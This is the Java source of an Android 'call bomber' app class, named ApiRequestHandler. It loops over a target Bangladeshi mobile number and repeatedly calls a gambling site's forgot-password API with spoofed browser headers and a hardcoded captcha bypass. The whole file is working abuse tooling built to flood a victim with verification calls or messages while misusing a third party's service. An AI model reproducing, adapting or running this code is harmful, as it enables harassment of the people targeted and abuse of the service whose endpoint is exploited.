package nader.callbomber.paid;

import android.content.Context;
import android.os.Handler;
import android.os.HandlerThread;
import android.widget.Toast;

import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class ApiRequestHandler {

    private static final String GET_URL = "https://feapi.unicorn88.xyz/api/member/requestCaptchaCode";
    private static final String POST_URL = "https://feapi.unicorn88.xyz/api/member/reqFgtPsw";
    private static final String USER_AGENT = "Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36";
    private Context context;
    private HandlerThread handlerThread;


    public ApiRequestHandler(Context context) {
        this.context = context;
    }

    public void startRequests(final String mobileNumber, final int quantity) {
        handlerThread = new HandlerThread("ApiRequestThread");
        handlerThread.start();
        Handler handler = new Handler(handlerThread.getLooper());
        
        handler.post(new Runnable() {
            @Override
            public void run() {
                for (int i = 0; i < quantity; i++) {
                    CreateUU.makeGetRequest();
                    makePostRequest(mobileNumber);
                    try {
                        Thread.sleep(300000); // Sleep for 300 seconds (5 minutes)
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
                handlerThread.quitSafely();
            }
        });
    }

    private void makeGetRequest() {
    try {
        // Define the base URL
        String baseUrl = "https://feapi.unicorn88.xyz";
        
        // Define parameters
        String params = "?captcha_id=89a60ab4-ab7f-4d99-bb2c-fdfdc1f9e1d7&captcha_code=0000";
        
        // Append parameters to the base URL
        URL url = new URL(baseUrl + params);
        
        // Open connection
        HttpURLConnection connection = (HttpURLConnection) url.openConnection();
        
        // Set request method to GET
        connection.setRequestMethod("GET");
        
        // Set request properties/headers
        connection.setRequestProperty("Host", "feapi.unicorn88.xyz");
        connection.setRequestProperty("Accept", "application/json, text/plain, */*");
        connection.setRequestProperty("User-Agent", "Mozilla/5.0 (Linux; Android 7.1.2; Nexus 5 Build/N2G47H; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/81.0.4044.117 Mobile Safari/537.36");
        connection.setRequestProperty("Origin", "https://bhaggo.com");
        connection.setRequestProperty("X-Requested-With", "com.via.ssl");
        connection.setRequestProperty("Sec-Fetch-Site", "cross-site");
        connection.setRequestProperty("Sec-Fetch-Mode", "cors");
        connection.setRequestProperty("Sec-Fetch-Dest", "empty");
        connection.setRequestProperty("Referer", "https://bhaggo.com/login");
        connection.setRequestProperty("Accept-Encoding", "gzip, deflate");
        connection.setRequestProperty("Accept-Language", "en-US,en;q=0.9");
        
        // Get response code
        int responseCode = connection.getResponseCode();
        
        // Read the response
        BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream()));
        String inputLine;
        StringBuilder response = new StringBuilder();
        while ((inputLine = in.readLine()) != null) {
            response.append(inputLine);
        }
        in.close();
        showToast(response.toString());
        
    } catch (Exception e) {
        e.printStackTrace();
    }
}

    private void makePostRequest(String mobileNumber) {
        try {
            URL url = new URL(POST_URL);
            HttpURLConnection connection = (HttpURLConnection) url.openConnection();
            connection.setRequestMethod("POST");
            connection.setRequestProperty("User-Agent", USER_AGENT);
            connection.setRequestProperty("Content-Type", "application/json");
            connection.setRequestProperty("Accept", "application/json, text/plain, */*");
            connection.setRequestProperty("Referer", "https://bhaggo.com/login");
            
            String jsonInputString = "{\"mobile\": \"" + mobileNumber + "\", \"prefix\": \"+880\", \"captcha_id\": \"89a60ab4-ab7f-4d99-bb2c-fdfdc1f9e1d7\", \"captcha_code\": \"0000\"}";

            connection.setDoOutput(true);
            try (OutputStream os = connection.getOutputStream()) {
                byte[] input = jsonInputString.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            int responseCode = connection.getResponseCode();
            BufferedReader in = new BufferedReader(new InputStreamReader(connection.getInputStream(), "utf-8"));
            StringBuilder response = new StringBuilder();
            String responseLine;
            while ((responseLine = in.readLine()) != null) {
                response.append(responseLine.trim());
            }
            in.close();

            System.out.println("POST Request for Mobile: " + mobileNumber);
            System.out.println("Status Code: " + responseCode);
            System.out.println("Response Body: " + response.toString());
showToast(response.toString());
            JSONObject jsonResponse = new JSONObject(response.toString());
            boolean success = jsonResponse.getBoolean("success");

            if (success) {
                showToast("Success");
            } else {
                showToast("Number not found");
            }

        } catch (Exception e) {
            e.printStackTrace();
            showToast("System Error");
        }
    }

    private void showToast(final String message) {
        Handler mainHandler = new Handler(context.getMainLooper());
        mainHandler.post(new Runnable() {
            @Override
            public void run() {
                Toast.makeText(context, message, Toast.LENGTH_LONG).show();
            }
        });
    }
}
